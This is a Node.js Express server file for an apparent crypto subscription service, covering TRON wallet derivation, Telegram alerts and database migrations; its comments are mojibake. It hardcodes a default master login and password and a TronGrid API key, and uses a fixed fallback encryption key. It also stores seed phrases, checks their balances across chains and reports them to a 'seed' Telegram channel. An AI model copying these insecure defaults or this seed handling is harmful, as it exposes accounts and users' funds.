const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const fs = require('fs');
const multer = require('multer');
// child_process? ? ?? ?? ? ? (seed-checker.js require ???? ??)

// seed-checker.js ?? ???? ?? ?? ?? ??
const { checkMultiChainBalance } = require('./seed-checker');
const { HDNodeWallet } = require('ethers');
require('dotenv').config();

// ---------- TRON HD ?? ?? ?? ----------
const BASE58_ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

function base58Encode(buf) {
  let num = BigInt('0x' + buf.toString('hex'));
  const base = BigInt(58);
  let result = '';
  while (num > 0n) {
    result = BASE58_ALPHABET[Number(num % base)] + result;
    num = num / base;
  }
  for (let i = 0; i < buf.length && buf[i] === 0; i++) result = '1' + result;
  return result;
}

function ethAddressToTron(ethAddress) {
  const hex = ethAddress.replace('0x', '').toLowerCase();
  const raw = Buffer.from('41' + hex, 'hex');
  const h1 = crypto.createHash('sha256').update(raw).digest();
  const h2 = crypto.createHash('sha256').update(h1).digest();
  return base58Encode(Buffer.concat([raw, h2.slice(0, 4)]));
}

// ---------- ???/xpub ??? ?? ----------
// .env? WALLET_SECRET_KEY=<64?? hex> ?? ??
// ??? ? ?? ????? ?? ??? ?? ??? ??? ?? ? ??? .env? ??? ??
const _walletSecretKey = (() => {
  const envKey = process.env.WALLET_SECRET_KEY;
  if (envKey && envKey.length === 64) return Buffer.from(envKey, 'hex');
  console.warn('??  WALLET_SECRET_KEY ???. ?? ? ?? ? .env? 64?? hex ?? ?????!');
  // ??: ?? ?? ? ?? fallback (????? ??? .env ??)
  return crypto.createHash('sha256').update('mynolab-wallet-key-fallback').digest();
})();

function encryptSecret(plaintext) {
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', _walletSecretKey, iv);
  const enc = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return `enc:${iv.toString('hex')}:${enc.toString('hex')}:${tag.toString('hex')}`;
}

function decryptSecret(stored) {
  if (!stored || !stored.startsWith('enc:')) return stored; // plain fallback
  const parts = stored.split(':');
  if (parts.length !== 4) return stored;
  const [, ivHex, encHex, tagHex] = parts;
  const decipher = crypto.createDecipheriv('aes-256-gcm', _walletSecretKey, Buffer.from(ivHex, 'hex'));
  decipher.setAuthTag(Buffer.from(tagHex, 'hex'));
  const dec = Buffer.concat([decipher.update(Buffer.from(encHex, 'hex')), decipher.final()]);
  return dec.toString('utf8');
}

// secret = ???(12/24??) ?? xpub ?
// ???: m/44'/195'/0'/0/index ??? TRON ?? ??
// xpub: ?? ???? ?? (sweep ??)
function deriveTronAddress(secret, index) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('???/xpub ?? ????.');
  if (plain.startsWith('xpub') || plain.startsWith('xprv')) {
    const node = HDNodeWallet.fromExtendedKey(plain);
    return ethAddressToTron(node.deriveChild(index).address);
  }
  // ??? ? TRON ?? m/44'/195'/0'/0/index
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
  return ethAddressToTron(wallet.address);
}

// ????? ??? ?? (sweep?)
function deriveTronPrivateKey(secret, index) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('???? ????.');
  if (plain.startsWith('xpub')) throw new Error('xpub??? ??? ?? ?? (sweep ??). ???? ?????.');
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/${index}`);
  return wallet.privateKey.replace('0x', '');
}

// ????? ??(m/44'/195'/0'/0) ??? ?? ? TRX ????
function deriveRootPrivateKey(secret) {
  const plain = decryptSecret(secret);
  if (!plain) throw new Error('???? ????.');
  if (plain.startsWith('xpub')) throw new Error('xpub? ?? ? ?? ??');
  // ???? = ??? 0 (?? ??? 1?? ??)
  const wallet = HDNodeWallet.fromPhrase(plain, undefined, `m/44'/195'/0'/0/0`);
  return wallet.privateKey.replace('0x', '');
}

// MariaDB ??
const db = require('./db');
const axios = require('axios');
const cron = require('node-cron');

const app = express();
app.set('trust proxy', 1); // nginx ? ??? X-Forwarded-For ? ?? IP ??
const PORT = process.env.PORT || 3000;

const MASTER_ID = process.env.MASTER_ID || 'tlarbwjd';
const MASTER_PW = process.env.MASTER_PW || 'tlarbwjd';

/** ??? ???? ????? ?? IP? ??? ? ?? */
function normalizeClientIp(ip) {
  if (!ip || typeof ip !== 'string') return '';
  const s = ip.trim();
  if (!s) return '';
  return s.startsWith('::ffff:') ? s.slice(7) : s;
}

function getClientPublicIp(req) {
  const xf = req.headers['x-forwarded-for'];
  if (typeof xf === 'string' && xf.trim()) {
    const first = xf.split(',')[0].trim();
    const n = normalizeClientIp(first);
    if (n) return n;
  }
  const xr = req.headers['x-real-ip'];
  if (typeof xr === 'string' && xr.trim()) {
    const n = normalizeClientIp(xr.trim());
    if (n) return n;
  }
  const raw = req.ip || req.socket?.remoteAddress || '';
  return normalizeClientIp(String(raw));
}

/** ??? ?? ? ?? IP ?? ?? (?? ??? ??? ??? ??) */
async function recordLoginPublicIp(req, loginType, userKey) {
  try {
    const key = userKey != null ? String(userKey).trim().slice(0, 191) : '';
    if (!key) return;
    const publicIp = getClientPublicIp(req);
    if (!publicIp) return;
    const ua = (req.headers['user-agent'] || '').toString().slice(0, 512);
    await db.pool.query(
      'INSERT INTO login_public_ips (login_type, user_key, public_ip, user_agent) VALUES (?, ?, ?, ?)',
      [loginType, key, publicIp.slice(0, 45), ua || null]
    );
  } catch (e) {
    console.warn('[login_public_ips]', e.message);
  }
}

// ---------- DB ?????? ----------
async function runMigrations() {
  try {
    await db.pool.query(`
      ALTER TABLE managers
        ADD COLUMN IF NOT EXISTS tg_bot_token VARCHAR(300) DEFAULT NULL,
        ADD COLUMN IF NOT EXISTS tg_chat_id   VARCHAR(100) DEFAULT NULL
    `);
    console.log('? DB ??????: managers.tg_bot_token / tg_chat_id ?? ??');
  } catch (e) {
    console.error('DB ?????? ??:', e.message);
  }
  try {
    const [depCols] = await db.pool.query("SHOW COLUMNS FROM managers LIKE 'tg_chat_deposit'");
    if (depCols.length === 0) {
      await db.pool.query('ALTER TABLE managers ADD COLUMN tg_chat_deposit VARCHAR(100) DEFAULT NULL AFTER tg_chat_id');
      await db.pool.query('ALTER TABLE managers ADD COLUMN tg_chat_approval VARCHAR(100) DEFAULT NULL AFTER tg_chat_deposit');
      console.log('? DB ??????: managers.tg_chat_deposit / tg_chat_approval ??');
    }
  } catch (e) {
    console.error('DB ??????(managers ?? chat) ??:', e.message);
  }
  try {
    const [ownTg] = await db.pool.query("SHOW COLUMNS FROM account_owners LIKE 'tg_bot_token'");
    if (ownTg.length === 0) {
      await db.pool.query('ALTER TABLE account_owners ADD COLUMN tg_bot_token VARCHAR(300) DEFAULT NULL');
      await db.pool.query('ALTER TABLE account_owners ADD COLUMN tg_chat_seed VARCHAR(100) DEFAULT NULL');
      console.log('? DB ??????: account_owners ????(?? ??) ?? ??');
    }
  } catch (e) {
    console.error('DB ??????(account_owners tg) ??:', e.message);
  }
  try {
    // ??? ??? ?? ??? (?? settings ???? ??)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS master_settings (
        skey  VARCHAR(100) NOT NULL PRIMARY KEY,
        sval  TEXT         DEFAULT NULL
      )
    `);
    console.log('? DB ??????: master_settings ??? ?? ??');

    // ?? ?? ???? settings ???? skey/sval ???? ?? ??? ?? ??
    // settingDB ? setting_key / setting_value ??? ????? ?? ??? ???
    const [[colCheck]] = await db.pool.query(
      `SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS
       WHERE TABLE_SCHEMA = DATABASE() AND TABLE_NAME = 'settings' AND COLUMN_NAME = 'skey'`
    );
    if (colCheck) {
      // ??? ???(skey ?? ??) ? ?? ? ??? ??? ???
      await db.pool.query('DROP TABLE settings');
      await db.pool.query(`
        CREATE TABLE settings (
          setting_key   VARCHAR(100) NOT NULL PRIMARY KEY,
          setting_value TEXT         DEFAULT NULL
        )
      `);
      console.log('? DB ??????: settings ??? ??? ?? ??');
    } else {
      // ?? ?? ??? ?? (???? ??)
      await db.pool.query(`
        CREATE TABLE IF NOT EXISTS settings (
          setting_key   VARCHAR(100) NOT NULL PRIMARY KEY,
          setting_value TEXT         DEFAULT NULL
        )
      `);
    }
  } catch (e) {
    console.error('DB ??????(settings) ??:', e.message);
  }
  try {
    // ???? ???? ??? ?? ?? (????? ?? seeds ? ??)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS event_seeds (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        phrase      TEXT         NOT NULL COMMENT '?? ??',
        note        VARCHAR(255) DEFAULT NULL COMMENT '??',
        btc         DECIMAL(36,18) DEFAULT NULL,
        eth         DECIMAL(36,18) DEFAULT NULL,
        tron        DECIMAL(36,18) DEFAULT NULL,
        sol         DECIMAL(36,18) DEFAULT NULL,
        status      ENUM('available','assigned','cancelled') NOT NULL DEFAULT 'available',
        created_at  DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_status (status)
      )
    `);
    console.log('? DB ??????: event_seeds ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(event_seeds) ??:', e.message);
  }
  try {
    // ?? ?? ?? ??? (event_seeds ? ??)
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS seed_gifts (
        id           INT AUTO_INCREMENT PRIMARY KEY,
        event_seed_id INT          NOT NULL,
        user_id      VARCHAR(100) NOT NULL,
        phrase       TEXT         NOT NULL,
        note         VARCHAR(255) DEFAULT NULL,
        status       ENUM('pending','delivered','cancelled') NOT NULL DEFAULT 'pending',
        created_at   DATETIME     NOT NULL DEFAULT NOW(),
        delivered_at DATETIME     DEFAULT NULL,
        INDEX idx_user_status (user_id, status)
      )
    `);
    console.log('? DB ??????: seed_gifts ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(seed_gifts) ??:', e.message);
  }
  // seed_gifts ??? ?? ?? (?? ??? ??)
  try {
    // event_seed_id ??? ??
    const [giftCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'event_seed_id'");
    if (giftCols.length === 0) {
      await db.pool.query("ALTER TABLE seed_gifts ADD COLUMN event_seed_id INT DEFAULT NULL AFTER id");
      console.log('? seed_gifts.event_seed_id ?? ???');
    }
    // seed_id ? NOT NULL ?? nullable ? ?? (??? ??? ??)
    const [seedIdCols] = await db.pool.query("SHOW COLUMNS FROM seed_gifts LIKE 'seed_id'");
    if (seedIdCols.length > 0) {
      const col = seedIdCols[0];
      if (col.Null === 'NO') {
        await db.pool.query("ALTER TABLE seed_gifts MODIFY COLUMN seed_id INT DEFAULT NULL");
        console.log('? seed_gifts.seed_id ? nullable ???');
      }
    }
  } catch (e) {
    console.error('DB ??????(seed_gifts ??) ??:', e.message);
  }
  // seeds ??? ?? ?? (seed_checker.py ??? API? ?????)
  try {
    const seedCols = [
      ['balance',      'DECIMAL(36,18) DEFAULT 0'],
      ['usdt_balance', 'DECIMAL(36,18) DEFAULT 0'],
      ['btc',          'DECIMAL(36,18) DEFAULT NULL'],
      ['eth',          'DECIMAL(36,18) DEFAULT NULL'],
      ['tron',         'DECIMAL(36,18) DEFAULT NULL'],
      ['sol',          'DECIMAL(36,18) DEFAULT NULL'],
      ['checked',      'TINYINT(1) DEFAULT 0'],
      ['checked_at',   'DATETIME NULL'],
    ];
    for (const [col, def] of seedCols) {
      const [rows] = await db.pool.query(`SHOW COLUMNS FROM seeds LIKE ?`, [col]);
      if (rows.length === 0) {
        await db.pool.query(`ALTER TABLE seeds ADD COLUMN ${col} ${def}`);
        console.log(`? DB ??????: seeds.${col} ?? ??`);
      }
    }
    console.log('? DB ??????: seeds ??? ?? ?? ??');
  } catch (e) {
    console.error('DB ??????(seeds ??) ??:', e.message);
  }

  // ===== macroUser ??? ??? =====
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mu_users (
        id            INT AUTO_INCREMENT PRIMARY KEY,
        name          VARCHAR(100) NOT NULL,
        login_id      VARCHAR(100) NOT NULL UNIQUE,
        password_hash VARCHAR(255) NOT NULL,
        role          ENUM('ADMIN','USER') NOT NULL DEFAULT 'USER',
        status        ENUM('active','inactive') NOT NULL DEFAULT 'active',
        created_at    DATETIME NOT NULL DEFAULT NOW(),
        updated_at    DATETIME NOT NULL DEFAULT NOW() ON UPDATE NOW()
      )
    `);
    console.log('? DB ??????: mu_users ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(mu_users) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mu_sessions (
        id            INT AUTO_INCREMENT PRIMARY KEY,
        user_id       INT NOT NULL,
        token         VARCHAR(100) NOT NULL UNIQUE,
        last_activity DATETIME NOT NULL DEFAULT NOW(),
        INDEX idx_token (token),
        FOREIGN KEY (user_id) REFERENCES mu_users(id) ON DELETE CASCADE
      )
    `);
    console.log('? DB ??????: mu_sessions ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(mu_sessions) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_accounts (
        id                       INT AUTO_INCREMENT PRIMARY KEY,
        owner_user_id            INT NOT NULL,
        account_name             VARCHAR(100) DEFAULT NULL,
        external_service_name    VARCHAR(100) DEFAULT NULL,
        login_id                 VARCHAR(100) DEFAULT NULL,
        login_password_encrypted TEXT         DEFAULT NULL,
        account_status           ENUM('PENDING','ACTIVE','SUSPENDED','EXPIRED','ERROR') NOT NULL DEFAULT 'PENDING',
        connection_status        ENUM('CONNECTED','DISCONNECTED','CHECKING') NOT NULL DEFAULT 'DISCONNECTED',
        last_checked_at          DATETIME     DEFAULT NULL,
        last_login_at            DATETIME     DEFAULT NULL,
        memo                     TEXT         DEFAULT NULL,
        created_at               DATETIME     NOT NULL DEFAULT NOW(),
        updated_at               DATETIME     NOT NULL DEFAULT NOW() ON UPDATE NOW(),
        INDEX idx_owner (owner_user_id),
        FOREIGN KEY (owner_user_id) REFERENCES mu_users(id) ON DELETE CASCADE
      )
    `);
    console.log('? DB ??????: managed_accounts ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(managed_accounts) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_account_logs (
        id                  INT AUTO_INCREMENT PRIMARY KEY,
        managed_account_id  INT NOT NULL,
        event_type          VARCHAR(50)  DEFAULT NULL,
        message             TEXT         DEFAULT NULL,
        payload_json        TEXT         DEFAULT NULL,
        created_at          DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_account (managed_account_id),
        FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
      )
    `);
    console.log('? DB ??????: managed_account_logs ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(managed_account_logs) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS managed_account_tasks (
        id                  INT AUTO_INCREMENT PRIMARY KEY,
        managed_account_id  INT NOT NULL,
        task_type           VARCHAR(50)  DEFAULT NULL,
        task_status         ENUM('QUEUED','RUNNING','SUCCESS','FAILED') NOT NULL DEFAULT 'QUEUED',
        started_at          DATETIME     DEFAULT NULL,
        ended_at            DATETIME     DEFAULT NULL,
        result_message      TEXT         DEFAULT NULL,
        created_at          DATETIME     NOT NULL DEFAULT NOW(),
        INDEX idx_account (managed_account_id),
        FOREIGN KEY (managed_account_id) REFERENCES managed_accounts(id) ON DELETE CASCADE
      )
    `);
    console.log('? DB ??????: managed_account_tasks ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(managed_account_tasks) ??:', e.message);
  }

  // ===== ??? ??? ?? =====
  try {
    await db.pool.query(`
      ALTER TABLE managers
        ADD COLUMN IF NOT EXISTS settlement_rate DECIMAL(5,2) NOT NULL DEFAULT 10.00 COMMENT '?? ?? (%)'
    `);
    console.log('? DB ??????: managers.settlement_rate ?? ??');
  } catch (e) {
    console.error('DB ??????(managers.settlement_rate) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS miner_status (
        id          INT AUTO_INCREMENT PRIMARY KEY,
        user_id     VARCHAR(50) NOT NULL UNIQUE COMMENT '??? ID',
        status      ENUM('running','stopped') NOT NULL DEFAULT 'stopped',
        coin_type   VARCHAR(20) NOT NULL DEFAULT 'BTC',
        assigned_at DATETIME DEFAULT NULL,
        updated_at  TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
        INDEX idx_status (status)
      )
    `);
    console.log('? DB ??????: miner_status ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(miner_status) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS mining_records (
        id        INT AUTO_INCREMENT PRIMARY KEY,
        user_id   VARCHAR(50) NOT NULL,
        coin_type VARCHAR(20) NOT NULL DEFAULT 'BTC',
        amount    DECIMAL(20,8) NOT NULL DEFAULT 0,
        mined_at  DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        note      TEXT DEFAULT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_user (user_id),
        INDEX idx_mined_at (mined_at)
      )
    `);
    console.log('? DB ??????: mining_records ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(mining_records) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS settlements (
        id                INT AUTO_INCREMENT PRIMARY KEY,
        manager_id        VARCHAR(50) NOT NULL,
        user_id           VARCHAR(50) NOT NULL,
        payment_amount    DECIMAL(20,8) NOT NULL,
        settlement_rate   DECIMAL(5,2) NOT NULL DEFAULT 0,
        settlement_amount DECIMAL(20,8) NOT NULL,
        payment_type      ENUM('new','renewal') NOT NULL DEFAULT 'new',
        created_at        DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_manager (manager_id),
        INDEX idx_user (user_id),
        INDEX idx_created (created_at)
      )
    `);
    console.log('? DB ??????: settlements ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(settlements) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS withdrawal_requests (
        id             INT AUTO_INCREMENT PRIMARY KEY,
        manager_id     VARCHAR(50) NOT NULL,
        amount         DECIMAL(20,8) NOT NULL,
        wallet_address VARCHAR(200) DEFAULT NULL,
        status         ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending',
        reject_reason  TEXT DEFAULT NULL,
        requested_at   DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        processed_at   DATETIME DEFAULT NULL,
        INDEX idx_manager (manager_id),
        INDEX idx_status (status),
        INDEX idx_requested (requested_at)
      )
    `);
    console.log('? DB ??????: withdrawal_requests ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(withdrawal_requests) ??:', e.message);
  }

  // ===== ?? ?? ?? ??? =====
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS account_owners (
        id         VARCHAR(50) NOT NULL PRIMARY KEY COMMENT '?? ?? ID',
        pw         VARCHAR(255) NOT NULL COMMENT '????',
        name       VARCHAR(100) DEFAULT NULL COMMENT '?? ??',
        telegram   VARCHAR(100) DEFAULT NULL COMMENT '??? ID',
        manager_id VARCHAR(50)  DEFAULT NULL COMMENT '?? ??? ID',
        created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_manager (manager_id)
      )
    `);
    console.log('? DB ??????: account_owners ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(account_owners) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS owner_sessions (
        token        VARCHAR(64) NOT NULL PRIMARY KEY,
        owner_id     VARCHAR(50) NOT NULL,
        last_activity DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_owner (owner_id)
      )
    `);
    console.log('? DB ??????: owner_sessions ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(owner_sessions) ??:', e.message);
  }
  try {
    // account_owners ???? status ?? ??
    const [oCols] = await db.pool.query("SHOW COLUMNS FROM account_owners LIKE 'status'");
    if (oCols.length === 0) {
      await db.pool.query("ALTER TABLE account_owners ADD COLUMN status ENUM('pending','approved','rejected') NOT NULL DEFAULT 'pending' AFTER manager_id");
      console.log('? DB ??????: account_owners.status ?? ??');
    } else {
      console.log('? DB ??????: account_owners.status ?? ??');
    }
  } catch (e) {
    console.error('DB ??????(account_owners.status) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS bulk_payment_sessions (
        id               VARCHAR(64)    NOT NULL PRIMARY KEY,
        owner_id         VARCHAR(50)    NOT NULL,
        entries          TEXT           NOT NULL COMMENT 'JSON [{userId,days}]',
        target_date      DATE           NOT NULL,
        total_usdt       DECIMAL(12,4)  NOT NULL,
        deposit_address  VARCHAR(60)    DEFAULT NULL,
        wallet_version   INT            DEFAULT NULL,
        derivation_index INT            DEFAULT NULL,
        status           ENUM('pending','paid','complete','expired') NOT NULL DEFAULT 'pending',
        created_at       DATETIME       NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_bulk_status (status),
        INDEX idx_bulk_owner  (owner_id)
      )
    `);
    console.log('? DB ??????: bulk_payment_sessions ?? ??');
  } catch (e) {
    console.error('DB ??????(bulk_payment_sessions) ??:', e.message);
  }
  try {
    // users ???? owner_id ?? ??
    const [cols] = await db.pool.query("SHOW COLUMNS FROM users LIKE 'owner_id'");
    if (cols.length === 0) {
      await db.pool.query("ALTER TABLE users ADD COLUMN owner_id VARCHAR(50) DEFAULT NULL COMMENT '?? ?? ?? ID'");
      console.log('? DB ??????: users.owner_id ?? ??');
    } else {
      console.log('? DB ??????: users.owner_id ?? ??');
    }
  } catch (e) {
    console.error('DB ??????(users.owner_id) ??:', e.message);
  }
  try {
    await db.pool.query(`
      CREATE TABLE IF NOT EXISTS login_public_ips (
        id           BIGINT AUTO_INCREMENT PRIMARY KEY,
        login_type   ENUM('app_user','owner','admin','mu_user') NOT NULL COMMENT '??? ??',
        user_key     VARCHAR(191) NOT NULL COMMENT '? users.id / ?????? id / ??? id / mu login_id',
        public_ip    VARCHAR(45)  NOT NULL,
        user_agent   VARCHAR(512) DEFAULT NULL,
        created_at   DATETIME     NOT NULL DEFAULT CURRENT_TIMESTAMP,
        INDEX idx_type_created (login_type, created_at),
        INDEX idx_user_key (user_key),
        INDEX idx_public_ip (public_ip)
      )
    `);
    console.log('? DB ??????: login_public_ips ??? ?? ??');
  } catch (e) {
    console.error('DB ??????(login_public_ips) ??:', e.message);
  }
}
runMigrations();

// ---------- Master Telegram (1 bot token + per-channel chat ids) ----------
const MASTER_TG_KEYS = [
  'master_tg_bot_token',
  'master_tg_chat_id',
  'master_tg_chat_deposit',
  'master_tg_chat_seed',
  'master_tg_chat_approval',
];
async function getMasterTgConfig() {
  try {
    const [rows] = await db.pool.query(
      'SELECT skey, sval FROM master_settings WHERE skey IN (?,?,?,?,?)',
      MASTER_TG_KEYS
    );
    const m = {};
    for (const r of rows) m[r.skey] = r.sval;
    const legacy = (m.master_tg_chat_id || '').toString().trim() || null;
    const botToken = (m.master_tg_bot_token || '').toString().trim() || null;
    const d = (m.master_tg_chat_deposit || '').toString().trim() || null;
    const s = (m.master_tg_chat_seed || '').toString().trim() || null;
    const a = (m.master_tg_chat_approval || '').toString().trim() || null;
    return {
      botToken,
      chatDeposit: d || legacy,
      chatSeed: s || legacy,
      chatApproval: a || legacy,
      legacyChatId: legacy,
    };
  } catch (_) {
    return { botToken: null, chatDeposit: null, chatSeed: null, chatApproval: null, legacyChatId: null };
  }
}
async function getMasterTelegram() {
  const c = await getMasterTgConfig();
  return { botToken: c.botToken, chatId: c.chatDeposit };
}
/** master_settings ???? ? ?? ?? ? body? ?? ?? DB ??? ?? */
async function mergeMasterTgSettingsFromBody(body = {}) {
  const [rows] = await db.pool.query(
    'SELECT skey, sval FROM master_settings WHERE skey IN (?,?,?,?,?)',
    MASTER_TG_KEYS
  );
  const cur = {};
  for (const r of rows) cur[r.skey] = r.sval;
  const pick = (skey, bodyKey) => {
    if (!Object.prototype.hasOwnProperty.call(body, bodyKey)) return cur[skey] ?? null;
    const v = body[bodyKey];
    if (v == null || String(v).trim() === '') return null;
    return String(v).trim();
  };
  const nextBot = Object.prototype.hasOwnProperty.call(body, 'botToken')
    ? body.botToken != null && String(body.botToken).trim() !== ''
      ? String(body.botToken).trim()
      : null
    : cur.master_tg_bot_token ?? null;
  const pairs = [
    ['master_tg_bot_token', nextBot],
    ['master_tg_chat_id', pick('master_tg_chat_id', 'chatId')],
    ['master_tg_chat_deposit', pick('master_tg_chat_deposit', 'chatDeposit')],
    ['master_tg_chat_seed', pick('master_tg_chat_seed', 'chatSeed')],
    ['master_tg_chat_approval', pick('master_tg_chat_approval', 'chatApproval')],
  ];
  for (const [k, v] of pairs) {
    await db.pool.query(
      'INSERT INTO master_settings (skey, sval) VALUES (?, ?) ON DUPLICATE KEY UPDATE sval = VALUES(sval)',
      [k, v]
    );
  }
}
async function sendMasterTelegramChannel(kind, text) {
  const c = await getMasterTgConfig();
  if (!c.botToken) return;
  const chat = kind === 'deposit' ? c.chatDeposit : kind === 'seed' ? c.chatSeed : c.chatApproval;
  if (chat) await sendTelegram(c.botToken, chat, text);
}
async function sendManagerTelegramByChannel(managerId, channel, text) {
  if (!managerId) return;
  const [[mgr]] = await db.pool.query(
    'SELECT tg_bot_token, tg_chat_id, tg_chat_deposit, tg_chat_approval FROM managers WHERE id = ?',
    [managerId]
  );
  if (!mgr?.tg_bot_token) return;
  const dep = (mgr.tg_chat_deposit || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
  const appr = (mgr.tg_chat_approval || '').toString().trim() || (mgr.tg_chat_id || '').toString().trim() || null;
  const chat = channel === 'deposit' ? dep : appr;
  if (chat) await sendTelegram(mgr.tg_bot_token, chat, text);
}

// ---------- TRON RPC ?? ----------
// TronGrid ?? ??? 429(?? ??)? ?? ? ?? ???? ?? ?? ??
const TRON_FULL_HOST = 'https://tron-rpc.publicnode.com';

// ---------- ???? ?? ----------
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// HTML ???? ????? (Telegram HTML ?? ?? ??)
function escapeHtml(str) {
  return String(str ?? '')
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

// ?? Telegram ?? ?? (?? 20?, ??? ???)
const _tgErrorLog = [];
function _pushTgError(entry) {
  _tgErrorLog.unshift(entry);
  if (_tgErrorLog.length > 20) _tgErrorLog.pop();
}

// throwOnError=true ?? ?? ? ?? ?? (??? ??????)
// parseMode: 'HTML'(??) | 'plain' (HTML ?? ?? ??)
async function sendTelegram(botToken, chatId, text, throwOnError = false, parseMode = 'HTML') {
  try {
    const body = { chat_id: chatId, text };
    if (parseMode === 'HTML') body.parse_mode = 'HTML';
    await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      body,
      { timeout: 8000 }
    );
    console.log(`[TELEGRAM] ?? ?? ? chatId=${chatId}`);
  } catch (e) {
    const desc = e.response?.data?.description || e.message;
    const errCode = e.response?.data?.error_code;
    console.error(`[TELEGRAM] ?? ?? chatId=${chatId}: ${desc}`);
    _pushTgError({ time: new Date().toISOString(), chatId, error: desc, code: errCode });
    if (throwOnError) throw new Error(`Telegram ??: ${desc}`);
  }
}

// ---------- ?? ?? & ?? ?? ----------

const DEFAULT_PACKAGES = [
  { days: 30, price: 39 }, { days: 60, price: 75 },
  { days: 90, price: 110 }, { days: 180, price: 210 }, { days: 365, price: 390 },
];

async function calcDaysFromUsdt(usdtAmount) {
  // ?? ??? ??: ?? ?? 30? ??
  console.log(`[calcDays] ??? ?? ? ${usdtAmount} USDT ? 30? ??`);
  return 30;

  /* ?? ?? ?? (??? ??? ? ? ? ?? ? ?? ??)
  try {
    const raw = await db.settingDB.get('subscription_packages');
    const monthlyRaw = await db.settingDB.get('monthly_price_usdt');
    const packages = raw ? JSON.parse(raw) : DEFAULT_PACKAGES;
    const monthlyPrice = monthlyRaw ? Number(monthlyRaw) : 39;

    // ??? ?? ?? (?5% ??)
    const matched = packages
      .slice()
      .sort((a, b) => Math.abs(a.price - usdtAmount) - Math.abs(b.price - usdtAmount))[0];
    if (matched && Math.abs(matched.price - usdtAmount) / matched.price <= 0.05) {
      return matched.days;
    }
    // ?? ??
    return Math.max(1, Math.floor((usdtAmount / monthlyPrice) * 30));
  } catch { return Math.max(1, Math.floor((usdtAmount / 39) * 30)); }
  */
}

const TRON_FULL_HOST_CALC = 'https://api.trongrid.io'; // ?? ???? ???
const USDT_ENERGY_NEEDED = 65_000; // USDT TRC20 ??? ??? ??? ???

// TRON ?? ?????? ?? ??? ??? ??? ??? TRX ??
async function calcTrxNeeded() {
  try {
    const TRON_KEY = process.env.TRONGRID_API_KEY || 'c2b82453-208b-4607-9222-896e921990cb';
    const resp = await axios.get(`${TRON_FULL_HOST_CALC}/wallet/getchainparameters`, {
      headers: { 'TRON-PRO-API-KEY': TRON_KEY },
      timeout: 8000
    });
    const params = resp.data?.chainParameter || [];
    const ep = params.find(p => p.key === 'getEnergyFee');
    const energyFee = ep?.value || 420; // sun / energy unit
    const trxRaw = Math.ceil((USDT_ENERGY_NEEDED * energyFee) / 1_000_000);
    const trxNeeded = Math.max(trxRaw + 2, 15); // +2 TRX bandwidth ??, ?? 15
    console.log(`[TRX-CALC] ??? ??=${energyFee} sun ? ?? TRX=${trxNeeded}`);
    return trxNeeded;
  } catch (e) {
    console.warn('[TRX-CALC] ?? ???? ?? ??, fallback=28:', e.message);
    return 28;
